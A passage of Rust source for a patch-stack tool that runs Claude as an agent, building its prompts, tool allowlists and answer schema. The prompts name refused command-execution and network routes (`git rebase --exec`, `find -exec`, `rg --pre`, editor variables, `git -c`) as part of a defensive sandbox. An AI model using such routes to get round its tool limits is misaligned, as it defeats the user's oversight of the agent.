                tail: guessed_from(db, &name),
            }
        });
        let go = match way {
            // A change has the stack to itself, from the stack as the change
            // before it left it, reviewed; chained, while that change waits
            // for review, from the stack it makes, as if accepted. One waiting
            // for what runs holds back the answers behind it, so it goes next.
            Way::Change => {
                if !st.change && (st.chain || (!st.reviewing && st.answers == 0)) {
                    st.change = true;
                    true
                } else {
                    st.change_waits |= st.chain || !st.reviewing;
                    false
                }
            }
            // Chained, an answer runs alongside the changes, on the stack as
            // it is: accepting a change asks it again.
            Way::Answer => {
                let go = st.chain || (!st.change && !st.change_waits);
                if go {
                    st.answers += 1;
                }
                go
            }
            // A build and test, while no change runs on its stack, and no
            // other build and test anywhere: of the stack as it is.
            Way::Test => {
                let go = !st.change && !test;
                if go {
                    test = true;
                }
                go
            }
        };
        if !go {
            continue;
        }
        // Chained, a change goes on from the work under review.
        let after = if st.chain && on.is_none() && way == Way::Change { st.tail.clone() } else { None };
        let Some((from, _)) = db.head(&name) else { continue };
        let id = crate::db::unique();
        let shown = notes
            .iter()
            .enumerate()
            .map(|(i, n)| Shown {
                label: format!("c{}", i + 1),
                change: n.change.clone(),
                id: n.id.clone(),
            })
            .collect();
        let info = Info {
            way,
            scope,
            from,
            notes: shown,
            base: String::new(),
            repo: String::new(),
            worktree: None,
            kept: false,
            back: None,
            untracked: Vec::new(),
            patch: None,
            commits: vec![],
            prompt: String::new(),
            on,
            after,
            batch: b.clone(),
            dropped: false,
            was,
            todo: None,
            effort,
        };
        db.add_run(Run {
            id: id.clone(),
            what: way.name().into(),
            stack: name.clone(),
            state: RunState::Started,
            request: notes.first().map(|n| first_line(&n.text)).unwrap_or_default(),
            ask: Some(serde_json::to_value(&info).unwrap()),
            starter: Some(std::process::id()),
            ..Default::default()
        })?;
        for n in notes {
            db.set_note(Note { queued: None, ..n })?;
        }
        started.push(id);
    }
    Ok(started)
}

fn first_line(text: &str) -> String {
    thread_turns(text)
        .last()
        .map(|t| t.body.lines().next().unwrap_or("").to_string())
        .unwrap_or_default()
}

/// A run that could not start: failed, and its comments with it. The
/// folder made for its rebase plan, if one was, goes.
fn fail_start(db_path: &Path, id: &str, why: &str) -> Result<()> {
    Db::edit(db_path, |db| {
        let Some(r) = db.run(id).cloned() else { return Ok(()) };
        if let Some(i) = info(&r) {
            mark_failed(db, &i, why)?;
            if let Some(dir) = &i.todo {
                drop_plan(Path::new(dir), &plans_busy(db, id));
            }
        }
        db.add_run(Run {
            state: RunState::Failed,
            summary: format!("could not start: {why}"),
            pid: None,
            ..r
        })?;
        Ok(())
    })
}

fn mark_failed(db: &mut Db, i: &Info, why: &str) -> Result<()> {
    for sh in &i.notes {
        if let Some(n) = db.note(&sh.change, &sh.id).cloned() {
            db.set_note(Note {
                failed: Some(why.into()),
                ..n
            })?;
        }
    }
    Ok(())
}

/// A comment's place in the stack, as the prompt says it.
fn place(db: &Db, s: &Stack, n: &Note) -> String {
    if let Some(rev) = n.about {
        return format!("on the stack's history, about @{rev} ({})", n.preview);
    }
    if n.on_stack() {
        return match &n.moved {
            Some(m) => format!("on the stack (moved there from {})", where_was(db, s, m)),
            None => "on the stack".into(),
        };
    }
    let at = s
        .patches
        .iter()
        .position(|id| db.patch(id).change == n.change)
        .map_or("a patch no longer in the stack".to_string(), |i| format!("patch {}", i + 1));
    if n.file == MSG_PATH {
        format!("{at}, its message, line `{}`", n.preview)
    } else if crate::diff::is_file_key(&n.line) {
        format!("{at}, the file {} as a whole", n.file)
    } else {
        format!("{at}, {} line `{}`", n.file, n.preview)
    }
}

fn where_was(db: &Db, s: &Stack, m: &Moved) -> String {
    let at = s
        .patches
        .iter()
        .position(|id| db.patch(id).change == m.change)
        .map_or("a patch".to_string(), |i| format!("patch {}", i + 1));
    match crate::diff::is_file_key(&m.line) {
        true => format!("{at}, the file {} as a whole", m.file),
        false => format!("{at}, {} line `{}`", m.file, m.preview),
    }
}

/// For comments on the stack's history: the history, oldest first, and
/// each record asked about in full; with the commands that show more.
/// Nothing for others.
fn history_part(db: &Db, i: &Info, s: &Stack, cmd: &str) -> String {
    let revs: Vec<usize> = i
        .notes
        .iter()
        .filter_map(|sh| db.note(&sh.change, &sh.id)?.about)
        .collect();
    if revs.is_empty() {
        return String::new();
    }
    let name = &s.name;
    let mut entries = crate::history::entries(db, name);
    entries.reverse();
    // The latest of a long history.
    let skip = entries.len().saturating_sub(300);
    let mut p = format!(
        "\nThe stack's history, oldest first: each record that changed it (an edit, an undo, a redo, a \
         select), by its rev, and what it changed in short (+ patches added, − dropped, ~ given a new \
         version, ↕ moved){}:\n",
        if skip > 0 { format!(" ({skip} older ones left out)") } else { String::new() }
    );
    for e in &entries[skip..] {
        p.push_str(&format!("  {} {}\n", crate::db::local_time(e.time), e.text));
    }
    p.push_str(
        "\nA record asked about comes with its stack diff: the stack after it, bottom first, each patch \
         by its place and marked (+ added, ~ a new version, what changed in its mail indented under it, \
         ↕ moved, from where it `was`; unmarked, as it was), and each patch dropped, marked −.\n",
    );
    for rev in revs {
        p.push_str(&format!("\nWhat @{rev} was:\n"));
        for l in crate::history::about(db, name, rev).into_iter().take(400) {
            p.push_str(&format!("  {l}\n"));
        }
    }
    p.push_str(&format!(
        "\nMore of it: `{cmd} log {name}` (every edit, and the stack each was made from), \
         `{cmd} tree {name}`, `{cmd} export {name} --rev @N` (the stack as it was at @N, as mail), \
         `{cmd} versions {name} PATCH` and `{cmd} interdiff {name} PATCH --from ID` (a patch's \
         versions, and what changed between them), `{cmd} comments {name}`. PATCH is a position \
         from 1, or an id. Answer about the history as asked; the comments you open go on lines \
         of the stack as it is now.\n"
    ));
    p
}

/// What stacked always gives an ask to answer only, `cmd` being stacked on
/// its database: it reads the code and the stack, and changes nothing.
/// What else it may run is the settings' (`agent.answer_tools`: curl and
/// jq unless set, to read the web), each command of a pipe needing its own.
fn answer_given(cmd: &str) -> String {
    format!(
        "Read,Grep,Glob,LS,Bash(git show *),Bash(git log *),Bash(git diff *),Bash({cmd} export *),\
         Bash({cmd} log *),Bash({cmd} tree *),Bash({cmd} versions *),Bash({cmd} interdiff *),\
         Bash({cmd} show *),Bash({cmd} comments *)"
    )
}

/// What stacked always gives an ask that changes the stack, `cmd` being
/// stacked on its database: git's history commands and the commands that
/// read (`allowed_tools`), none that reaches the network, and stacked's
/// own, to check that the patches above still apply, and to read the stack.
fn change_given(cmd: &str) -> String {
    format!("{},Bash({cmd} fits *),Bash({cmd} export *)", allowed_tools())
}

/// What stacked always gives each kind of ask, said, a line each: as the
/// setup shows it, beside what the settings add.
pub const CHANGE_GIVEN: [&str; 3] = [
    "Read, Grep, Glob, LS, and commands that read: grep, rg, find, cat, sed, sort…",
    "git's history commands (status, log, show, diff, add, commit, reset, rebase -i…), and git config to read",
    "stacked's fits and export; none of what is given reaches the network, so a change cannot touch a remote",
];
pub const ANSWER_GIVEN: [&str; 2] = [
    "Read, Grep, Glob, LS, and git show, log and diff",
    "stacked's commands that read the stack: export, show, log, tree, versions, interdiff, comments",
];

/// What an ask in `way` may use, `cmd` being stacked on its database, as
/// claude takes it (`--allowedTools`): what stacked gives that kind of ask,
/// then what the settings `agent` add for that kind (`change_tools`,
/// `answer_tools`), then what they add for every ask (`tools`). A build and
/// test runs what the project needs: Bash at large, and every ask's.
pub fn tools_for(way: Way, cmd: &str, agent: &crate::config::Agent) -> String {
    let (mut tools, own): (String, &[String]) = match way {
        Way::Change => (change_given(cmd), &agent.change_tools),
        Way::Answer => (answer_given(cmd), &agent.answer_tools),
        Way::Test => (format!("Bash,{}", allowed_tools()), &[]),
    };
    // Its answer given as structured output: with the tool claude gives it
    // with.
    if agent.schema {
        tools.push_str(",StructuredOutput");
    }
    for t in own.iter().chain(&agent.tools) {
        tools.push(',');
        tools.push_str(t);
    }
    tools
}

/// What an ask to answer only is told of the web: that it may read it with
/// curl, when its tools let it run curl; and with the tools of the MCP
/// servers it is let use.
const READ_THE_WEB: &str = "You may read the web with `curl` to answer (a bug on Bugzilla, a \
revision on Phabricator, a page of documentation), what it reads through `jq` if need be, and use \
the tools of MCP servers you are let use: only to read, never to send anything of this repository \
anywhere.";
const READ_WITH_TOOLS: &str = "You may use the tools of MCP servers you are let use to answer (a bug \
on Bugzilla, a revision on Phabricator): only to read, never to send anything of this repository \
anywhere.";

/// A thread as a conversation, for claude.
fn transcript(text: &str) -> String {
    thread_turns(text)
        .iter()
        .map(|t| {
            let who = match t.role {
                Role::You => "The user".to_string(),
                Role::Agent => "You (the agent, earlier)".to_string(),
                Role::Reviewer => format!("{} (a reviewer, on Phabricator)", t.tag.as_deref().unwrap_or("someone")),
            };
            // What it points at, said rather than as its block.
            let (body, pointers) = crate::refs::split(&t.body);
            let pointers: Vec<String> = pointers
                .iter()
                .map(|p| {
                    let name = p.n.map_or(String::new(), |k| format!("r{k}, "));
                    match &p.to {
                        crate::refs::Pointer::Lines(r) => format!("{name}{}", r.said()),
                        crate::refs::Pointer::Comment { change, id } => format!("{name}the comment [{}]", crate::db::short_id(change, id)),
                        crate::refs::Pointer::Link(url) => format!("{name}the web link {url}"),
                    }
                })
                .collect();
            match pointers.is_empty() {
                true => format!("{who}: {body}"),
                false => format!("{who}: {body}\n(pointing at: {})", pointers.join("; ")),
            }
        })
        .collect::<Vec<_>>()
        .join("\n")
}

/// The most lines of a file attached to a comment the agent is shown.
const ATTACHED_LINES: usize = 200;

/// What is attached to comment `n`, as the agent is told it: each reference
/// by its name, a comment as it stands, open or closed, lines as stack `s`
/// has them, a web link as it is, not to be fetched. Nothing if nothing
/// is.
fn attached_part(db: &Db, s: &Stack, n: &Note) -> String {
    if n.attached.is_empty() {
        return String::new();
    }
    let mut out = "Attached to it, as what it says names them (@r1; @r{1,2} several; @r* all), for what they say; \
                   they are not asked of you:\n"
        .to_string();
    for a in &n.attached {
        match &a.to {
            crate::refs::To::Comment { change, id } => match crate::refs::find_comment(db, &s.name, change, id) {
                Some((c, open)) => {
                    let state = if open { "open" } else { "closed" };
                    out += &format!("  {} [{}] {} ({state}):\n", a.name(), crate::db::short_id(&c.change, &c.id), place(db, s, &c));
                    for l in transcript(&c.text).lines() {
                        out += &format!("    {l}\n");
                    }
                }
                None => out += &format!("  {}: a comment that is gone\n", a.name()),
            },
            crate::refs::To::Lines(l) => {
                let Some(r) = crate::refs::Ref::parse(l) else { continue };
                out += &format!("  {}: {}:\n", a.name(), r.said());
                let Some(text) = lines_text(db, s, &r) else {
                    out += "    (the file is not there)\n";
                    continue;
                };
                let all: Vec<&str> = text.lines().collect();
                let wanted: Vec<usize> = match r.whole() {
                    true => (1..=all.len()).collect(),
                    false => r.ranges.iter().flat_map(|&(x, y)| x..=y.min(all.len())).collect(),
                };
                for &k in wanted.iter().take(ATTACHED_LINES) {
                    out += &format!("    {k:>5} │ {}\n", all[k - 1]);
                }
                if wanted.len() > ATTACHED_LINES {
                    out += &format!("    … {} lines more\n", wanted.len() - ATTACHED_LINES);
                }
            }
            crate::refs::To::Link(url) => out += &format!("  {}: a web link, {url} ({LINK_UNREAD})\n", a.name()),
        }
    }
    out
}

/// What the agent is told of a web link attached to a comment.
const LINK_UNREAD: &str = "you need not fetch it, and may not be able to: your tools may not reach the network";

/// The file reference `r` is of, as it says: as a patch of stack `s`
/// leaves it, as the stack's base has it, or as the whole stack leaves it.
fn lines_text(db: &Db, s: &Stack, r: &crate::refs::Ref) -> Option<String> {
    use crate::refs::At;
    match r.at {
        At::Patch(n) if (1..=s.patches.len()).contains(&n) => crate::ops::file_at(db, s, n - 1, &r.file).ok().flatten(),
        At::Patch(_) => None,
        At::Top if !s.patches.is_empty() => crate::ops::file_at(db, s, s.patches.len() - 1, &r.file).ok().flatten(),
        _ => {
            let (repo, base) = crate::ops::base_of(s).ok()?;
            git::git(&repo, &["show", &format!("{base}:{}", r.file)]).ok()
        }
    }
}

/// Where an ask to answer only is, told it: the repository as the user has
/// it, which need not be the stack.
const HERE: &str = "The current directory is the user's repository, as it is checked out now: \
its files need not be as the stack leaves them, so read the stack through stacked, as below.";

/// What the agent is told of the comments it opens: one issue each, as
/// many on one line as it has issues there.
const ONE_ISSUE: &str = "Each comment you open is about one issue: a line with two issues gets two \
comments, each on that line.";

const KEEP_TITLES: &str = "Keep each commit's title unless asked to change it: a patch is \
followed across its versions by its title. When you are done, everything must be committed \
and HEAD must be the top. You cannot build the project or run its tests here; reason from the \
code. Do not push or fetch, nor stash. Nothing you run here reaches the network: git's settings \
are not yours to set (`git -c`, `git config` but to read them), and what would run another \
program is refused (`git rebase --exec`, `find -exec`, `rg --pre`).";

/// The most lines of a dropped change's stack diff a prompt shows.
const BEFORE_LINES: usize = 300;

/// What ask `i`, asked again, is told of what run `was` brought back before
/// it was dropped, the stack having changed: its replies and the comments it
/// opened; for a change, what it changed, its stack diff from the stack it
/// went on from, and how to read the stack it made.
fn before(db: &Db, i: &Info, was: &str, name: &str, cmd: &str) -> String {
    // Nothing brought back: nothing to tell.
    if db.run(was).and_then(|r| r.held.as_ref()).is_none_or(Held::is_empty) {
        return String::new();
    }
    let out = match i.way {
        Way::Answer => " This was asked before, on the stack as it was before an edit of it was \
                        accepted; what was answered then is below. Answer again on the stack as it is \
                        now: keep what still holds, and say what the edit changes."
            .to_string(),
        _ => format!(
            " This was asked before, going on from an edit that was then dropped; what was \
             made then is below, and `{cmd} export {name} --work {was}` prints the stack it \
             made. Make it again on the stack as it is now, keeping what still applies."
        ),
    };
    out + &brought(db, i, was, name, cmd, true)
}

/// What run `was` brought back, for ask `i` to go on from or make again: its
/// replies (`replies`: unless their threads hold them already), the comments
/// it opened, and for a change, what it changed, as a stack diff from the
/// stack it went on from.
fn brought(db: &Db, i: &Info, was: &str, name: &str, cmd: &str, replies: bool) -> String {
    let Some((r, h)) = db.run(was).and_then(|r| Some((r, r.held.as_ref()?))) else { return String::new() };
    let mut out = String::new();
    for sh in i.notes.iter().filter(|_| replies) {
        if let Some(rp) = h.replies.iter().find(|rp| rp.change == sh.change && rp.id == sh.id) {
            out += &format!("\n\nWhat was answered then to {}:\n{}", sh.label, rp.text.trim_end());
        }
    }
    for n in &h.opened {
        out += &format!("\n\nA comment opened then, on {}: {}", n.preview, crate::thread::thread_turns(&n.text).last().map_or("", |t| t.body.as_str()));
    }
    // A change: what it changed, from the stack it went on from.
    if let (Some(_), Some(old)) = (&h.stack, info(r))
        && let (Ok(start), Ok(made)) = (started_from(db, &old), work_stack(db, was))
    {
        let lines: Vec<String> = crate::history::stacks_diff(db, Some(&start), Some(&made), true).iter().map(crate::history::Diffed::text).collect();
        out += "\n\nWhat was changed then, as a stack diff:\n";
        out += &lines.iter().take(BEFORE_LINES).cloned().collect::<Vec<_>>().join("\n");
        if lines.len() > BEFORE_LINES {
            out += &format!("\n… and {} lines more: `{cmd} export {name} --work {was}` has it all", lines.len() - BEFORE_LINES);
        }
    }
    out
}

/// The prompt for an ask: what it may do, the stack, the comments, and
/// what to answer with. An answer is told it may read the web with curl if
/// `curl` says it is let run curl.
fn prompt(db: &Db, i: &Info, s: &Stack, cmd: &str, run: &str, structured: bool, curl: bool) -> String {
    let web = if curl { READ_THE_WEB } else { READ_WITH_TOOLS };
    // How it answers: as structured output, which claude checks against
    // what this asks for (`answer_schema`); else as JSON it ends with.
    let (end, only, said) = match structured {
        true => (
            "Give your answer as the structured output asked of you",
            "Give your answer as the structured output asked of you",
            "in your answer",
        ),
        false => ("End your reply with a JSON object", "Output ONLY a JSON object", "in the JSON you end with"),
    };
    let n = s.patches.len();
    let k = i.patch.as_ref().map(|(_, k)| *k);
    // The stack it started from: at its rev; a guess's, or a round's sent
    // back, as the work it goes on from makes it.
    let at = i.after.as_ref().or(i.on.as_ref()).map_or(format!("--rev {}", i.from), |w| format!("--work {w}"));
    let export = format!("{cmd} export {} {at}", s.name);
    let show = format!("{cmd} show {} {at}", s.name);
    // Where it works, told it.
    let here = if i.back.is_some() {
        "The current directory is the user's own checkout, put at the stack for you: it goes \
         back where it was once you are done"
    } else {
        "The current directory is a git worktree made for you"
    };
    let mut p = match (i.way, &i.scope) {
        (Way::Change, Scope::Stack) => format!(
            "You are changing a stack of patches, as the comments below ask. {here}: the \
             stack is the commits {base}..HEAD, \
             each commit a patch, listed below bottom first. You may change any of them: \
             edit files and `git commit --amend` for HEAD, `git reset` and `git commit` to \
             split, a new commit where a new patch belongs. To change, reorder, squash or \
             drop commits below HEAD: (1) write the plan, with your file-editing tools, to \
             the rebase todo file named at the end: a `pick`, `edit`, `squash`, `fixup` or \
             `drop` line (`pick SHA TITLE`) for every commit of {base}..HEAD, bottom first, \
             a commit left out being dropped, no `exec` line (a plan that runs a command is \
             refused); (2) run a plain `git rebase -i {base}`, which \
             takes that plan; (3) at each `edit` stop, change the files and `git commit \
             --amend` (`-m` or `-F` for a new message: `reword` keeps the old one), then \
             `git rebase --continue`. No editor opens, and none is to be set: a command \
             that starts by setting a variable (`GIT_SEQUENCE_EDITOR=…`) is refused. A \
             commit's sha changes when it or a commit below it does: after a rebase, find \
             the commits by their titles. If a rebase conflicts and you cannot resolve it, \
             `git rebase --abort`, and say so. Do not touch \
             commits below {base}. To rebase the stack onto another commit, write the plan \
             of its picks, then `git rebase -i --onto COMMIT {base}`, and say onto what: \
             \"base\": COMMIT's full sha, {said}. \
             {KEEP_TITLES}",
            base = i.base
        ),
        (Way::Change, Scope::Patch(_)) => format!(
            "You are changing one patch of a stack, patch {k} of {n}, as the comments below \
             ask. {here}: the commits {base}..HEAD are the stack up to that patch, the \
             patches below it and the patch \
             itself on top, at HEAD. You may change only this patch: amend HEAD, or split it \
             into several commits in its place (its title stays on the first). Do not touch \
             the commits below it. The patches above it are not here: you may read them, not \
             change them: `{export}` prints the whole stack as mail. Before you finish, run \
             `{cmd} fits {run}`: it says whether the patches above still apply on your change. \
             If they would not, or if what is asked needs another patch to change too, change \
             nothing: `git reset --hard {orig}` puts the patch back as it was, and answer \
             with \"promote\" saying why, so the comment goes to the stack. {KEEP_TITLES}",
            k = k.map_or(0, |k| k + 1),
            base = i.base,
            orig = i.commits.last().map_or("HEAD", |c| c.0.as_str())
        ),
        (Way::Answer, Scope::Stack) if i.worktree.is_some() => format!(
            "You are answering comments on a stack of patches. The current directory is a git \
             worktree made for you: the stack is the commits {base}..HEAD, each commit a \
             patch, listed below bottom first; `git show` each to read it. Do NOT modify \
             anything. You cannot build the project or run its tests; reason from the code. \
             {web} Besides your answers, you may open comments of your own on lines \
             of any patch, as a careful reviewer would, without repeating what is already said. {ONE_ISSUE}",
            base = i.base
        ),
        (Way::Answer, Scope::Patch(_)) if i.worktree.is_some() => format!(
            "You are answering comments on one patch of a stack, patch {k} of {n}. The current \
             directory is a git worktree made for you: the commits {base}..HEAD are the stack \
             up to that patch, the patch itself at HEAD; `git show` to read them; `{export}` \
             prints the whole stack, the patches above included. Do NOT modify anything. You \
             cannot build the project or run its tests; reason from the code. {web} \
             Besides your answers, you may open comments of your own on lines of this patch, as \
             a careful reviewer would, without repeating what is already said. {ONE_ISSUE}",
            k = k.map_or(0, |k| k + 1),
            base = i.base
        ),
        (Way::Answer, Scope::Stack) => format!(
            "You are answering comments on a stack of patches, listed below bottom first; they \
             apply to commit {base}. {HERE} `{export}` prints the stack's patches as mail, \
             `{show} N` patch N, and `{show} N --path FILE` a file as patch N leaves it, \
             whether the stack changes it or not. Do NOT modify anything: no file, no commit, \
             no branch. You cannot build the project or run its tests; reason from the code. \
             {web} Besides your answers, you may open comments of your own on lines \
             of any patch, as a careful reviewer would, without repeating what is already said. {ONE_ISSUE}",
            base = i.base
        ),
        (Way::Answer, Scope::Patch(_)) => format!(
            "You are answering comments on one patch of a stack, patch {k} of {n}, listed below \
             with the others, bottom first; they apply to commit {base}. {HERE} `{show} {k}` \
             prints patch {k}, `{show} {k} --path FILE` a file as it leaves it, whether the \
             stack changes it or not, and `{export}` the whole stack, the patches above \
             included. Do NOT modify anything: no file, no commit, no branch. You cannot build \
             the project or run its tests; reason from the code. {web} Besides your \
             answers, you may open comments of your own on lines of this patch, as a careful \
             reviewer would, without repeating what is already said. {ONE_ISSUE}",
            k = k.map_or(0, |k| k + 1),
            base = i.base
        ),
        (Way::Test, scope) => {
            let what = match scope {
                Scope::Stack => format!("the stack's patches: the commits {}..HEAD, each commit a patch", i.base),
                Scope::Patch(_) => format!(
                    "patch {} with the patches below it: the commits {}..HEAD, the patch at HEAD; `{export}` \
                     prints the whole stack, the patches above included",
                    k.map_or(0, |k| k + 1),
                    i.base
                ),
            };
            format!(
                "You are building and testing {what}. The current directory is a git worktree of \
                 the stack's own, for its builds: build there, by your own rules for this \
                 repository, and run the tests that matter for what the patches change. It is \
                 kept for the next build, with what you build in it: build on what is already \
                 there. Do not change the files git tracks, nor commit: you change nothing in the stack, \
                 and what you find is your answer. Never use the user's current worktree, nor \
                 change a branch of the user's. Do not push."
            )
        }
    };
    // Another round: what it brought back was sent back. What it changed
    // then, and the comments it opened, shown, as to a round asked again;
    // its replies are in their threads.
    if let Some(on) = &i.on {
        let changed = db.run(on).and_then(|r| r.held.as_ref()).is_some_and(|h| h.stack.is_some());
        p.push_str(&match i.way {
            Way::Change if changed => format!(
                " This is another round: the user reviewed the change you made, which the worktree holds \
                 as you left it, and sent it back with the comments below: change it as they ask, from \
                 there. What you changed then is below, and `{cmd} export {} --work {on}` prints the \
                 stack you made.",
                s.name
            ),
            _ => " This is another round: the user read what you answered, and asks again in the comments below."
                .to_string(),
        });
        p.push_str(&brought(db, i, on, &s.name, cmd, false));
    }
    // Asked again, the work landed before dropped: shown, to reuse.
    if let Some(was) = &i.was {
        p.push_str(&before(db, i, was, &s.name, cmd));
    }
    p.push_str("\n\nThe stack, bottom first:\n");
    for (at, id) in s.patches.iter().enumerate() {
        let mark = if Some(at) == k { " ← this patch" } else { "" };
        p.push_str(&format!("  {} {}{mark}\n", at + 1, db.patch(id).title()));
    }
    p.push_str("\nThe comments, each a thread, the last word the user's or a reviewer's:\n");
    for sh in &i.notes {
        let Some(n) = db.note(&sh.change, &sh.id) else { continue };
        p.push_str(&format!("\n[{}] {}:\n{}\n", sh.label, place(db, s, n), transcript(&n.text)));
        p.push_str(&attached_part(db, s, n));
        p.push_str(&format!("(The references you attach to your reply to it are numbered from r{} on.)\n", crate::refs::next_of(n)));
    }
    p.push_str(&history_part(db, i, s, cmd));
    p.push_str(&match i.way {
        Way::Change => match i.scope {
            Scope::Stack => format!(
                "\n{end}: {{\"replies\": {{label: your reply to that comment, saying what you \
                 changed}}}}, labels as above ([c1] is \"c1\"); with \"base\": the commit's sha, \
                 when you rebased the stack onto another."
            ),
            Scope::Patch(_) => format!(
                "\n{end}: {{\"replies\": {{label: your reply to that comment, saying what you \
                 changed}}}}, labels as above ([c1] is \"c1\"); with \"promote\": why, when the \
                 comments need more than this patch."
            ),
        },
        Way::Answer => format!(
            "\n{only}: {{\"replies\": {{label: your answer}}, \"comments\": [{{\"patch\": its \
             number, \"file\": the path as the diff names it, \"side\": \"+\" for an added line, \
             \"-\" for a removed one, \" \" for context, \"line\": that line's exact text without \
             its leading +/-/space, or \"\" for the file as a whole, \"text\": your comment, one \
             issue}}]}}, the comments optional, as many on one line as it has issues."
        ),
        Way::Test => format!(
            "\n{end}: {{\"replies\": {{label: what you found, with the commands run}}, \
             \"patches\": {{its number: what building and testing it found}}}}."
        ),
    });
    p.push_str(REFS);
    p.push_str(NOT_ALLOWED);
    p
}

/// What an ask is told of a tool it is not let use: that nothing it would
/// have reached said no, so that it says not allowed, not that a service
/// refused.
const NOT_ALLOWED: &str = " A tool you are not let use is refused before it runs (\"Claude \
requested permissions to use …, but you haven't granted it yet\"): nothing it would have reached \
was asked. Say so in what you write: that the tool was not allowed, naming it \
(`mcp__moz__get_bugzilla_bug`, `Bash: curl …`), never that the service behind it refused, failed or \
would not let you read; then go on with what you can read. The user can let this kind of ask use it.";

/// What the agent's answer to ask `i`, on stack `s`, is to be, as a JSON
/// Schema: what its prompt asks for, given back as structured output
/// (`--json-schema`), which claude checks before it is done. Its replies by
/// the comments' labels, a build and test's findings by the patches'
/// numbers; what is written a string, or one with the references it
/// attaches: lines of a file, a comment, a web link.
fn answer_schema(i: &Info, s: &Stack) -> Value {
    use serde_json::json;
    let refs = json!({
        "type": "array",
        "items": {
            "type": "object",
            "properties": {
                "file": {"type": "string"},
                "lines": {"type": "string"},
                "patch": {"type": "integer"},
                "comment": {"type": "string"},
                "url": {"type": "string"}
            },
            "additionalProperties": false
        }
    });
    let written = json!({"anyOf": [
        {"type": "string"},
        {
            "type": "object",
            "properties": {"text": {"type": "string"}, "refs": refs.clone()},
            "required": ["text"],
            "additionalProperties": false
        }
    ]});
    let keyed = |keys: Vec<String>| {
        let props: Map<String, Value> = keys.into_iter().map(|k| (k, written.clone())).collect();
        json!({"type": "object", "properties": props, "additionalProperties": false})
    };
    let mut props = Map::new();
    props.insert("replies".into(), keyed(i.notes.iter().map(|sh| sh.label.clone()).collect()));
    match (i.way, &i.scope) {
        (Way::Change, Scope::Stack) => {
            props.insert("base".into(), json!({"type": "string"}));
        }
        (Way::Change, Scope::Patch(_)) => {
            props.insert("promote".into(), json!({"type": "string"}));
        }
        (Way::Answer, _) => {
            let comment = json!({
                "type": "object",
                "properties": {
                    "patch": {"type": "integer"},
                    "file": {"type": "string"},
                    "side": {"enum": ["+", "-", " "]},
                    "line": {"type": "string"},
                    "text": {"type": "string"},
                    "refs": refs
                },
                "required": ["patch", "file", "line", "text"],
                "additionalProperties": false
            });
            props.insert("comments".into(), json!({"type": "array", "items": comment}));
        }
        (Way::Test, _) => {
            props.insert("patches".into(), keyed((1..=s.patches.len()).map(|n| n.to_string()).collect()));
        }
    }
    json!({"type": "object", "properties": props, "required": ["replies"], "additionalProperties": false})
}

/// What an ask is told of the references it may attach to what it writes:
/// lines of a file, a comment of the stack, a web link, the stack first.
const REFS: &str = " To point at the code you mean, in the stack or out of it, anything you write \
there may be an object instead of a string, {\"text\": what you write, \"refs\": [...]}, and a \
comment you open may have \"refs\" too: each {\"file\": its path, \"lines\": \"120-140,200-210\" \
(none, the whole file), \"patch\": a patch's number, for the file as that patch leaves it; 0, as \
the stack's base has it; none, as the whole stack leaves it}; or, to point at a comment of the \
stack, {\"comment\": its label \
above ([c1] is \"c1\"), or its id, as `stacked comments` lists it}; or, to point at a page of the \
web, {\"url\": \"https://example.com/a/b\" (its whole address, https or http)}. Point at the stack \
first: when the code or the comments of the stack say what you mean, point at those lines of a \
file, as a patch, the base or the whole stack leaves it, or at that comment, rather than at a page \
of the web. A web link is for what nothing in the stack, the repository or its comments says (a \
bug, a specification, a page of documentation). The user reads each under what you wrote, and \
goes there. Each takes a number, in the order you give them: in a reply, from the one its comment \
above says; in a comment you open, from r1. In what you write, @r1 names reference r1 of the \
comment you write on, @r{1,2} several, @r* all of them: those attached to it, and those you \
attach.";

/// The program run as claude, when not `$STACKED_CLAUDE`'s or `claude`,
/// and the stacked an ask calls back (`prompt`, `record`, `land`), when not
/// this one: the editor's tests set them here, as they run the editor in a
/// process of their own and cannot each set the environment they share.
static CLAUDE: std::sync::Mutex<Option<(PathBuf, PathBuf)>> = std::sync::Mutex::new(None);

/// Runs `claude` as claude from now on, the asks calling `stacked` back.
pub fn stand_in(claude: &Path, stacked: &Path) {
    *CLAUDE.lock().unwrap() = Some((claude.to_path_buf(), stacked.to_path_buf()));
}

/// Has the git commands `c` runs make commits and tags unsigned, whatever
/// the user's git config says: settings added to those of `GIT_CONFIG_COUNT`.
fn unsigned(c: &mut Command) {
    let n: usize = std::env::var("GIT_CONFIG_COUNT").ok().and_then(|n| n.parse().ok()).unwrap_or(0);
    c.env("GIT_CONFIG_COUNT", (n + 2).to_string());
    for (k, (key, value)) in [("commit.gpgsign", "false"), ("tag.gpgsign", "false")].into_iter().enumerate() {
        c.env(format!("GIT_CONFIG_KEY_{}", n + k), key);
        c.env(format!("GIT_CONFIG_VALUE_{}", n + k), value);
    }
}

/// Claude's lines, stdout and stderr, go to `stacked record`, then a line
/// saying how it exited; then `stacked land` files what it did.
const WRAPPER: &str = r#"trap '' HUP INT
id="$1"; cwd="$2"; exe="$3"; db="$4"; shift 4
cd "$cwd" || exit 1
{ "${STACKED_CLAUDE:-claude}" -p "$("$exe" -f "$db" prompt "$id")" "$@" < /dev/null 2>&1
  echo "{\"type\":\"exit\",\"code\":$?}"; } | "$exe" -f "$db" record "$id"
"$exe" -f "$db" land "$id" > /dev/null 2>&1
"#;

/// What the agent has, as it says when it starts in `dir`, run as `cfg`
/// says (the settings there), in its first event (`system/init`): its
/// tools, and its MCP servers by name. It is stopped then, before it is
/// asked anything.
pub fn agent_tools(dir: &Path, cfg: &crate::config::Config) -> Result<(Vec<String>, Vec<String>)> {
    let claude = match CLAUDE.lock().unwrap().clone() {
        Some((claude, _)) => claude.to_string_lossy().into_owned(),
        None => cfg.agent_command(),
    };
    let mut c = Command::new(&claude);
    c.args(["-p", "Say OK.", "--output-format", "stream-json", "--verbose"]);
    c.args(cfg.agent_args());
    c.current_dir(dir).stdin(Stdio::null()).stdout(Stdio::piped()).stderr(Stdio::null());
    let mut child = c.spawn().map_err(|e| Error(format!("{claude}: {e}")))?;
    let out = child.stdout.take().ok_or_else(|| Error(format!("{claude}: no output")))?;
    let (tx, rx) = std::sync::mpsc::channel();
    std::thread::spawn(move || {
        for line in std::io::BufReader::new(out).lines().map_while(|l| l.ok()) {
            if let Ok(v) = serde_json::from_str::<Value>(&line)
                && v.get("type").and_then(Value::as_str) == Some("system")
                && v.get("subtype").and_then(Value::as_str) == Some("init")
            {
                let _ = tx.send(v);
                return;
            }
        }
    });
    let init = rx.recv_timeout(std::time::Duration::from_secs(60));
    let _ = child.kill();
    let _ = child.wait();
